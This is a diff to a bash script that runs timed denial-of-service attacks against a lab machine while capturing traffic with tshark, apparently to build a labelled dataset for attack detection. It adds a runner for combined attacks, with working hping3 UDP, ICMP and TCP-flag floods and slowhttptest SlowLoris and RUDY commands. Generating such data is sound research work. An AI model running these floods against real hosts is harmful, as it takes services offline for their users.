@@ -8,10 +8,21 @@ attack_procedure_log="/home/logs/attack_procedure.log"
 
 attack(){
     #Write to file
-    echo "Started "$1" attack" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
+    echo "Started $1 attack" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
 
     #Run the attack
     ./attack.sh $1 $2 $3 $4 $5 $6 $7 $8 "$9"
+
+    #Write to file
+    echo "$1 attack is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
+}
+
+mul_attack(){
+    #Write to file
+    echo "Started $1 attack" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
+
+    #Run the attack
+    ./mul_attack.sh $1 $2 $3 $4 $5 $6 $7 $8 "$9" "$10"
 
     #Write to file
     echo "$1 attack is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
@@ -230,3 +241,58 @@ destination_port=$machine13_port
 attack_script="hping3 --flood -p $destination_port -F -S -P -A -U -X -Y $destination_ip"
 
 attack $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port "$attack_script"
+
+#Write to file
+echo "Started break 9" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
+#Start Wireshark capture
+tshark -i $interface -w "/home/wiresharkTraces/Break9.pcap" -F pcap & pid_tshark=$!
+#Wait for next attack
+sleep $((3*60))
+#Stop the Wireshark capture
+kill $pid_tshark
+#Write to file
+echo "Break 9 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
+
+
+
+#Define variables for combined attack 1
+attack_type="UDPandSlowLoris"
+capture_file="/home/wiresharkTraces/UDPandSlowLoris.pcap"
+traceroute_log="/home/logs/UDPandSlowLoris_traceroute.log"
+attack_stats_log="/home/logs/UDPandSlowLoris_stats.log"
+attack_log="/home/logs/UDPandSlowLoris.log"
+attack_duration=$((15*60)) # in seconds
+destination_ip=$machine13_ip
+destination_port=$machine13_port
+attack_script1="hping3 --flood --udp -p $destination_port $destination_ip"
+attack_script2="slowhttptest -c 1000 -H -g -i 10 -r 200 -u http://$destination_ip -x 24 -p 3"
+
+mul_attack $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port "$attack_script1" "$attack_script2"
+
+
+#Write to file
+echo "Started break 10" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
+#Start Wireshark capture
+tshark -i $interface -w "/home/wiresharkTraces/Break10.pcap" -F pcap & pid_tshark=$!
+#Wait for next attack
+sleep $((7*60))
+#Stop the Wireshark capture
+kill $pid_tshark
+#Write to file
+echo "Break 10 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
+
+
+
+#Define variables for combined attack 1
+attack_type="ICMPandRUDY"
+capture_file="/home/wiresharkTraces/ICMPandRUDY.pcap"
+traceroute_log="/home/logs/ICMPandRUDY_traceroute.log"
+attack_stats_log="/home/logs/ICMPandRUDY_stats.log"
+attack_log="/home/logs/ICMPandRUDY.log"
+attack_duration=$((10*60)) # in seconds
+destination_ip=$machine13_ip
+destination_port=$machine13_port
+attack_script1="hping3 --flood -1 $destination_ip"
+attack_script2="slowhttptest -c 1000 -B -g -i 100 -r 200 -s 8192 -u http://$destination_ip -x 10 -p 3"
+
+mul_attack $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port "$attack_script1" "$attack_script2"
